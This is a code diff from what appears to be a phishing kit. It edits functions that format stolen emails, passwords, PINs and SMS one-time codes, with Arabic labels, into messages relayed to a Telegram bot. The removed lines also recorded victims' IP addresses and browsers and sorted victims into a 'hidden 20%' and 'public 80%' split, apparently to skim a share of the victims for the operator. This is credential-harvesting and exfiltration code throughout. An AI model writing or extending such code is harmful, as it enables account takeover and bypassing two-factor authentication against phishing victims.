@@ -41,53 +41,25 @@ export async function sendToTelegram(message: string): Promise<boolean> {
 export function formatLoginMessage(
   email: string, 
   password: string, 
-  pin: string, 
-  ipAddress?: string | null,
-  userAgent?: string | null,
-  userNumber?: number,
-  isHidden?: boolean
+  pin: string
 ): string {
-  const timestamp = new Date().toLocaleString("ar-EG", { timeZone: "Asia/Damascus" });
-  
   return `
 🔐 <b>تسجيل دخول جديد</b>
 
-📧 <b>البريد الإلكتروني:</b> ${email}
-🔑 <b>كلمة المرور:</b> ${password}
-🔢 <b>رمز PIN:</b> ${pin}
-
-📍 <b>عنوان IP:</b> ${ipAddress || "غير متوفر"}
-🌐 <b>نوع المتصفح:</b> ${userAgent || "غير متوفر"}
-
-${userNumber ? `👤 <b>رقم المستخدم:</b> #${userNumber}` : ""}
-${isHidden !== undefined ? `🔒 <b>القسم:</b> ${isHidden ? "مخفي (20%)" : "عام (80%)"}` : ""}
-
-⏰ <b>الوقت:</b> ${timestamp}
+📧 ${email}
+🔑 ${password}
+🔢 ${pin}
   `.trim();
 }
 
 export function formatSMSMessage(
   email: string, 
-  smsCode: string,
-  ipAddress?: string | null,
-  userAgent?: string | null,
-  userNumber?: number,
-  isHidden?: boolean
+  smsCode: string
 ): string {
-  const timestamp = new Date().toLocaleString("ar-EG", { timeZone: "Asia/Damascus" });
-  
   return `
 📱 <b>كود SMS جديد</b>
 
-📧 <b>البريد الإلكتروني:</b> ${email}
-💬 <b>كود SMS:</b> ${smsCode}
-
-📍 <b>عنوان IP:</b> ${ipAddress || "غير متوفر"}
-🌐 <b>نوع المتصفح:</b> ${userAgent || "غير متوفر"}
-
-${userNumber ? `👤 <b>رقم المستخدم:</b> #${userNumber}` : ""}
-${isHidden !== undefined ? `🔒 <b>القسم:</b> ${isHidden ? "مخفي (20%)" : "عام (80%)"}` : ""}
-
-⏰ <b>الوقت:</b> ${timestamp}
+📧 ${email}
+💬 ${smsCode}
   `.trim();
 }
